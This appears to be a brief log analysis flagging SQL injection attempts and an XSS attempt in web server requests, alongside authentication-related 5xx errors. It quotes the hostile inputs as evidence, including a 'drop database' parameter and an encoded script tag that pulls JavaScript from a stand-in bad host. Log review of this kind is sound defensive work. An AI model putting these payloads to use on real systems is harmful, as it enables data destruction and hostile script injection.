### Injection Flaws:

Multiple entries like DELETE /admin/add_product?id=drop+database+users HTTP/1.0 and GET /admin/add_user?id=SELECT+name+FROM+users HTTP/1.0 indicate SQL injection attempts.
Similar attempts are observed in entries like POST /purchase/completed?id=SELECT+name+FROM+users HTTP/1.0.

### Broken Authentication Status Codes:

The presence of many HTTP 500, 502, and 504 error codes related to authentication endpoints (/login, /register) could indicate issues with authentication mechanisms.
Examples: POST /login HTTP/1.0 502, GET /login HTTP/1.0 504.

### Cross-Site Scripting (XSS):

Entries such as POST /register?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3 HTTP/1.0 show attempts to inject scripts.
